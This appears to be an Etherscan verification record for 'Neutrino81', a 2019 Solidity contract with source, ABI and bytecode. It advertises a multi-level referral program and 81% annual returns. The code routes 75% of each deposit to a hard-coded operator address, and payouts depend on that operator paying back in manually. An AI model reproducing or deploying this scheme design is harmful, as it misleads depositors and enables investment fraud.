{
  "address": "0x897d6c6772b85bf25b46c6f6da454133478ea6ab",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "Neutrino81",
  "compilerVersion": "v0.4.25+commit.59dbf8f1",
  "optimization": true,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2019-03-21\n*/\n\npragma solidity ^0.4.25;\n\n/*\n    [Rules]\n\n  [✓]  21% Referral program\n            9% => ref link 1 (or Boss1, if none)\n            7% => ref link 2 (or Boss1, if none)\n            5% => ref link 3 (or Boss1, if none)\n        \n  [✓]  4% => dividends for NTS81 holders from each deposit\n\n  [✓]  81% annual interest in USDC\n            20.25% quarterly payments \n            6.75% monthly payments \n    \n  [✓]   Interest periods\n            Q1 15-20 April 2019\n            Q2 15-20 July 2019\n            Q3 15-20 October 2019\n            Q4 15-20 January 2020\n            Q1 15-20 April 2020\n*/\n\n\ncontract Neutrino81 {\n    modifier onlyBagholders {\n        require(myTokens() > 0);\n        _;\n    }\n\n    modifier onlyStronghands {\n        require(myDividends(true) > 0);\n        _;\n    }\n    \n    modifier onlyAdmin {\n        require(msg.sender == admin);\n        _;\n    }\n    \n    modifier onlyBoss2 {\n        require(msg.sender == boss2);\n        _;\n    }\n\n    string public name = \"Neutrino Token Standard 81\";\n    string public symbol = \"NTS81\";\n    address public admin;\n    address constant internal boss1 = 0xCa27fF938C760391E76b7aDa887288caF9BF6Ada;\n    address constant internal boss2 = 0xf43414ABb5a05c3037910506571e4333E16a4bf4;\n    uint8 constant public decimals = 18;\n    uint8 constant internal welcomeFee_ = 25;\n    uint8 constant internal refLevel1_ = 9;\n    uint8 constant internal refLevel2_ = 7;\n    uint8 constant internal refLevel3_ = 5;\n    uint256 constant internal tokenPrice = 0.001 ether;\n    \n    uint256 constant internal magnitude = 2 ** 64;\n    uint256 public stakingRequirement = 0.05 ether;\n    mapping(address => uint256) internal tokenBalanceLedger_;\n    mapping(address => uint256) public referralBalance_;\n    mapping(address => int256) internal payoutsTo_;\n    mapping(address => uint256) public repayBalance_;\n\n    uint256 internal tokenSupply_;\n    uint256 internal profitPerShare_;\n    \n    constructor() public {\n        admin = msg.sender;\n    }\n\n    function buy(address _ref1, address _ref2, address _ref3) public payable returns (uint256) {\n        return purchaseTokens(msg.value, _ref1, _ref2, _ref3);\n    }\n\n    function() payable public {\n        purchaseTokens(msg.value, 0x0, 0x0, 0x0);\n    }\n\n    function reinvest() onlyStronghands public {\n        uint256 _dividends = myDividends(false);\n        address _customerAddress = msg.sender;\n        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);\n        _dividends += referralBalance_[_customerAddress];\n        referralBalance_[_customerAddress] = 0;\n        uint256 _tokens = purchaseTokens(_dividends, 0x0, 0x0, 0x0);\n        emit onReinvestment(_customerAddress, _dividends, _tokens);\n    }\n\n    function exit() public {\n        address _customerAddress = msg.sender;\n        uint256 _tokens = tokenBalanceLedger_[_customerAddress];\n        if (_tokens > 0) getRepay();\n        withdraw();\n    }\n\n    function withdraw() onlyStronghands public {\n        address _customerAddress = msg.sender;\n        uint256 _dividends = myDividends(false);\n        payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);\n        _dividends += referralBalance_[_customerAddress];\n        referralBalance_[_customerAddress] = 0;\n        _customerAddress.transfer(_dividends);\n        emit onWithdraw(_customerAddress, _dividends, now);\n    }\n    \n    function getRepay() public {\n        address _customerAddress = msg.sender;\n        uint256 balance = repayBalance_[_customerAddress];\n        require(balance > 0);\n        repayBalance_[_customerAddress] = 0;\n        \n        _customerAddress.transfer(balance);\n        emit onGotRepay(_customerAddress, balance, now);\n    }\n\n    function myTokens() public view returns (uint256) {\n        address _customerAddress = msg.sender;\n        return balanceOf(_customerAddress);\n    }\n\n    function myDividends(bool _includeReferralBonus) public view returns (uint256) {\n        address _customerAddress = msg.sender;\n        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;\n    }\n\n    function balanceOf(address _customerAddress) public view returns (uint256) {\n        return tokenBalanceLedger_[_customerAddress];\n    }\n\n    function dividendsOf(address _customerAddress) public view returns (uint256) {\n        return (uint256) ((int256) (profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;\n    }\n\n    function purchaseTokens(uint256 _incomingEthereum, address _ref1, address _ref2, address _ref3) internal returns (uint256) {\n        address _customerAddress = msg.sender;\n        \n        uint256[4] memory uIntValues = [\n            _incomingEthereum * welcomeFee_ / 100,\n            0,\n            0,\n            0\n        ];\n        \n        uIntValues[1] = uIntValues[0] * refLevel1_ / welcomeFee_;\n        uIntValues[2] = uIntValues[0] * refLevel2_ / welcomeFee_;\n        uIntValues[3] = uIntValues[0] * refLevel3_ / welcomeFee_;\n        \n        uint256 _dividends = uIntValues[0] - uIntValues[1] - uIntValues[2] - uIntValues[3];\n        uint256 _taxedEthereum = _incomingEthereum - uIntValues[0];\n        \n        uint256 _amountOfTokens = ethereumToTokens_(_incomingEthereum);\n        uint256 _fee = _dividends * magnitude;\n\n        require(_amountOfTokens > 0);\n\n        if (\n            _ref1 != 0x0000000000000000000000000000000000000000 &&\n            tokenBalanceLedger_[_ref1] * tokenPrice >= stakingRequirement\n        ) {\n            referralBalance_[_ref1] += uIntValues[1];\n        } else {\n            referralBalance_[boss1] += uIntValues[1];\n            _ref1 = 0x0000000000000000000000000000000000000000;\n        }\n        \n        if (\n            _ref2 != 0x0000000000000000000000000000000000000000 &&\n            tokenBalanceLedger_[_ref2] * tokenPrice >= stakingRequirement\n        ) {\n            referralBalance_[_ref2] += uIntValues[2];\n        } else {\n            referralBalance_[boss1] += uIntValues[2];\n            _ref2 = 0x0000000000000000000000000000000000000000;\n        }\n        \n        if (\n            _ref3 != 0x0000000000000000000000000000000000000000 &&\n            tokenBalanceLedger_[_ref3] * tokenPrice >= stakingRequirement\n        ) {\n            referralBalance_[_ref3] += uIntValues[3];\n        } else {\n            referralBalance_[boss1] += uIntValues[3];\n            _ref3 = 0x0000000000000000000000000000000000000000;\n        }\n\n        referralBalance_[boss2] += _taxedEthereum;\n\n        if (tokenSupply_ > 0) {\n            tokenSupply_ += _amountOfTokens;\n            profitPerShare_ += (_dividends * magnitude / tokenSupply_);\n            _fee = _fee - (_fee - (_amountOfTokens * (_dividends * magnitude / tokenSupply_)));\n        } else {\n            tokenSupply_ = _amountOfTokens;\n        }\n\n        tokenBalanceLedger_[_customerAddress] += _amountOfTokens;\n        int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens - _fee);\n        payoutsTo_[_customerAddress] += _updatedPayouts;\n        \n        emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _ref1, _ref2, _ref3, now, tokenPrice);\n\n        return _amountOfTokens;\n    }\n\n    function ethereumToTokens_(uint256 _ethereum) public pure returns (uint256) {\n        uint256 _tokensReceived = _ethereum * 1e18 / tokenPrice;\n\n        return _tokensReceived;\n    }\n\n    function tokensToEthereum_(uint256 _tokens) public pure returns (uint256) {\n        uint256 _etherReceived = _tokens / tokenPrice * 1e18;\n\n        return _etherReceived;\n    }\n    \n    function fund() public payable {\n        uint256 perShare = msg.value * magnitude / tokenSupply_;\n        profitPerShare_ += perShare;\n        emit OnFunded(msg.sender, msg.value, perShare, now);\n    }\n    \n    /* Admin methods */\n    function passRepay(address customerAddress) public payable onlyBoss2 {\n        uint256 value = msg.value;\n        require(value > 0);\n        \n        repayBalance_[customerAddress] += value;\n        emit OnRepayPassed(customerAddress, value, now);\n    }\n\n    function passInterest(address customerAddress, uint256 usdRate, uint256 rate) public payable {\n     \n        require(msg.sender == admin || msg.sender == boss1 || msg.sender == boss2);\n        require(msg.value > 0);\n\n        referralBalance_[customerAddress] += msg.value;\n\n        emit OnInterestPassed(customerAddress, msg.value, usdRate, rate, now);\n    }\n    \n    event onTokenPurchase(\n        address indexed customerAddress,\n        uint256 incomingEthereum,\n        uint256 tokensMinted,\n        address ref1,\n        address ref2,\n        address ref3,\n        uint timestamp,\n        uint256 price\n    );\n\n    event onReinvestment(\n        address indexed customerAddress,\n        uint256 ethereumReinvested,\n        uint256 tokensMinted\n    );\n\n    event onWithdraw(\n        address indexed customerAddress,\n        uint256 value,\n        uint256 timestamp\n    );\n    \n    event onGotRepay(\n        address indexed customerAddress,\n        uint256 value,\n        uint256 timestamp\n    );\n    \n    event OnFunded(\n        address indexed source,\n        uint256 value,\n        uint256 perShare,\n        uint256 timestamp\n    );\n    \n    event OnRepayPassed(\n        address indexed customerAddress,\n        uint256 value,\n        uint256 timestamp\n    );\n\n    event OnInterestPassed(\n        address indexed customerAddress,\n        uint256 value,\n        uint256 usdRate,\n        uint256 rate,\n        uint256 timestamp\n    );\n}",
  "abi": "[{\"constant\":true,\"inputs\":[{\"name\":\"_customerAddress\",\"type\":\"address\"}],\"name\":\"dividendsOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_ethereum\",\"type\":\"uint256\"}],\"name\":\"ethereumToTokens_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"customerAddress\",\"type\":\"address\"},{\"name\":\"usdRate\",\"type\":\"uint256\"},{\"name\":\"rate\",\"type\":\"uint256\"}],\"name\":\"passInterest\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"stakingRequirement\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"repayBalance_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_includeReferralBonus\",\"type\":\"bool\"}],\"name\":\"myDividends\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_customerAddress\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getRepay\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"myTokens\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_ref1\",\"type\":\"address\"},{\"name\":\"_ref2\",\"type\":\"address\"},{\"name\":\"_ref3\",\"type\":\"address\"}],\"name\":\"buy\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"customerAddress\",\"type\":\"address\"}],\"name\":\"passRepay\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"fund\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_tokens\",\"type\":\"uint256\"}],\"name\":\"tokensToEthereum_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"referralBalance_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"exit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"admin\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"reinvest\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"incomingEthereum\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"tokensMinted\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"ref1\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"ref2\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"ref3\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"onTokenPurchase\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"ethereumReinvested\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"tokensMinted\",\"type\":\"uint256\"}],\"name\":\"onReinvestment\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"onWithdraw\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"onGotRepay\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"source\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"perShare\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnFunded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnRepayPassed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"usdRate\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"rate\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnInterestPassed\",\"type\":\"event\"}]",
  "bytecode": "60c0604052601a60808190527f4e65757472696e6f20546f6b656e205374616e6461726420383100000000000060a090815261003e91600091906100b3565b506040805180820190915260058082527f4e545338310000000000000000000000000000000000000000000000000000006020909201918252610083916001916100b3565b5066b1a2bc2ec5000060035534801561009b57600080fd5b5060028054600160a060020a0319163317905561014e565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100f457805160ff1916838001178555610121565b82800160010185558215610121579182015b82811115610121578251825591602001919060010190610106565b5061012d929150610131565b5090565b61014b91905b8082111561012d5760008155600101610137565b90565b610f1c806200015e6000396000f30060806040526004361061011b5763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166265318b811461012c57806306fdde031461015f5780632a9121c7146101e9578063313ce5671461020157806331e9b2fc1461022c5780633ccfd60b1461024857806356d399e81461025d5780635ab33fe414610272578063688abbf71461029357806370a08231146102ad5780638a811be8146102ce578063949e8acd146102e357806395d89b41146102f8578063961e1c491461030d5780639cd460b51461032d578063b60d428814610341578063bf3b397b14610349578063c664f7f114610361578063e9fad8ee14610382578063f851a44014610397578063fdb5a03e146103c8575b6101293460008060006103dd565b50005b34801561013857600080fd5b5061014d600160a060020a036004351661088d565b60408051918252519081900360200190f35b34801561016b57600080fd5b506101746108c8565b6040805160208082528351818301528351919283929083019185019080838360005b838110156101ae578181015183820152602001610196565b50505050905090810190601f1680156101db5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156101f557600080fd5b5061014d600435610956565b34801561020d57600080fd5b5061021661096f565b6040805160ff9092168252519081900360200190f35b610246600160a060020a0360043516602435604435610974565b005b34801561025457600080fd5b50610246610a43565b34801561026957600080fd5b5061014d610b19565b34801561027e57600080fd5b5061014d600160a060020a0360043516610b1f565b34801561029f57600080fd5b5061014d6004351515610b31565b3480156102b957600080fd5b5061014d600160a060020a0360043516610b72565b3480156102da57600080fd5b50610246610b8d565b3480156102ef57600080fd5b5061014d610c34565b34801561030457600080fd5b50610174610c46565b61014d600160a060020a0360043581169060243581169060443516610ca0565b610246600160a060020a0360043516610cb6565b610246610d47565b34801561035557600080fd5b5061014d600435610db5565b34801561036d57600080fd5b5061014d600160a060020a0360043516610dcc565b34801561038e57600080fd5b50610246610dde565b3480156103a357600080fd5b506103ac610e0a565b60408051600160a060020a039092168252519081900360200190f35b3480156103d457600080fd5b50610246610e19565b6000806103e8610ed1565b60008060008060003396506080604051908101604052806064601960ff168f0281151561041157fe5b04815260006020808301829052604080840183905260609384019290925283516019600982028190049286018390526007820281900493860184905260058202049385018490529399508303030395508c03935061046e8c610956565b925068010000000000000000850291506000831161048b57600080fd5b600160a060020a038b16158015906104c65750600354600160a060020a038c1660009081526004602052604090205466038d7ea4c680000210155b156104f657602080870151600160a060020a038d1660009081526005909252604090912080549091019055610546565b60208087015173ca27ff938c760391e76b7ada887288caf9bf6ada600090815260059092527fde36ce7eb11e9560e3589102959df06addbd281e4ed0c1aceb97c2b1b26c9094805490910190559a505b600160a060020a038a16158015906105815750600354600160a060020a038b1660009081526004602052604090205466038d7ea4c680000210155b156105b057604080870151600160a060020a038c16600090815260056020529190912080549091019055610600565b604086015173ca27ff938c760391e76b7ada887288caf9bf6ada600090815260056020527fde36ce7eb11e9560e3589102959df06addbd281e4ed0c1aceb97c2b1b26c9094805490920190915599505b600160a060020a0389161580159061063b5750600354600160a060020a038a1660009081526004602052604090205466038d7ea4c680000210155b15610669576060860151600160a060020a038a166000908152600560205260409020805490910190556106b9565b606086015173ca27ff938c760391e76b7ada887288caf9bf6ada600090815260056020527fde36ce7eb11e9560e3589102959df06addbd281e4ed0c1aceb97c2b1b26c9094805490920190915598505b73f43414abb5a05c3037910506571e4333e16a4bf4600090815260056020527f484ddd33a7497e1e6c12fb6e49b402e265cc6ffd09d1afa0881b73e9909a30da805486019055600854111561075a576008805484019081905568010000000000000000860281151561072757fe5b6009805492909104909101905560085468010000000000000000860281151561074c57fe5b048302820382039150610760565b60088390555b826004600089600160a060020a0316600160a060020a0316815260200190815260200160002060008282540192505081905550818360095402039050806006600089600160a060020a0316600160a060020a031681526020019081526020016000206000828254019250508190555086600160a060020a03167fc70e11839a0ba6c20d1eaacbcca6c11fe123e9c56277247f7a65ada3bcef26c88d858e8e8e4266038d7ea4c680006040518088815260200187815260200186600160a060020a0316600160a060020a0316815260200185600160a060020a0316600160a060020a0316815260200184600160a060020a0316600160a060020a0316815260200183815260200182815260200197505050505050505060405180910390a250909a9950505050505050505050565b600160a060020a0316600090815260066020908152604080832054600490925290912054600954680100000000000000009102919091030490565b6000805460408051602060026001851615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561094e5780601f106109235761010080835404028352916020019161094e565b820191906000526020600020905b81548152906001019060200180831161093157829003601f168201915b505050505081565b66038d7ea4c68000670de0b6b3a7640000919091020490565b601281565b600254600160a060020a03163314806109a057503373ca27ff938c760391e76b7ada887288caf9bf6ada145b806109be57503373f43414abb5a05c3037910506571e4333e16a4bf4145b15156109c957600080fd5b600034116109d657600080fd5b600160a060020a038316600081815260056020908152604091829020805434908101909155825190815290810185905280820184905242606082015290517f6c1600d1186e2b773f1ac8efc7947825d42085bc5663b920aa281a874efacf2a9181900360800190a2505050565b6000806000610a526001610b31565b11610a5c57600080fd5b339150610a696000610b31565b600160a060020a038316600081815260066020908152604080832080546801000000000000000087020190556005909152808220805490839055905193019350909183156108fc0291849190818181858888f19350505050158015610ad2573d6000803e3d6000fd5b50604080518281524260208201528151600160a060020a038516927f1b091269e929df55d64d6ea7e9cadbe4fb38dce5ccdc995767bc515030dbfbbf928290030190a25050565b60035481565b60076020526000908152604090205481565b60003382610b4757610b428161088d565b610b6b565b600160a060020a038116600090815260056020526040902054610b698261088d565b015b9392505050565b600160a060020a031660009081526004602052604090205490565b33600081815260076020526040812054908111610ba957600080fd5b600160a060020a0382166000818152600760205260408082208290555183156108fc0291849190818181858888f19350505050158015610bed573d6000803e3d6000fd5b50604080518281524260208201528151600160a060020a038516927f7ca7552d37d598bde3db9e59ec961f07c845a91004283e7d19a74900bce623d1928290030190a25050565b600033610c4081610b72565b91505090565b60018054604080516020600284861615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561094e5780601f106109235761010080835404028352916020019161094e565b6000610cae348585856103dd565b949350505050565b60003373f43414abb5a05c3037910506571e4333e16a4bf414610cd857600080fd5b503460008111610ce757600080fd5b600160a060020a0382166000818152600760209081526040918290208054850190558151848152429181019190915281517f819ed93d0a5cdcf2695fe7767c7855e26e69e1ced68a76a2a952a7608288b2d5929181900390910190a25050565b6000600854680100000000000000003402811515610d6157fe5b6009805492909104918201905560408051348152602081018390524281830152905191925033917fd44a3f360ad146fe6f63a3f3b719748687fc3808bc6320b1c00b520225f14cae9181900360600190a250565b66038d7ea4c680009004670de0b6b3a76400000290565b60056020526000908152604090205481565b3360008181526004602052604081205490811115610dfe57610dfe610b8d565b610e06610a43565b5050565b600254600160a060020a031681565b600080600080610e296001610b31565b11610e3357600080fd5b610e3d6000610b31565b33600081815260066020908152604080832080546801000000000000000087020190556005909152812080549082905590920194509250610e8190849080806103dd565b905081600160a060020a03167fbe339fc14b041c2b0e0f3dd2cd325d0c3668b78378001e53160eab36153264588483604051808381526020018281526020019250505060405180910390a2505050565b60806040519081016040528060049060208202803883395091929150505600a165627a7a72305820e385c11a1396ddca4402f308911c042ae20cac8b2dd1bea01ef6351333f5ed7e0029"
}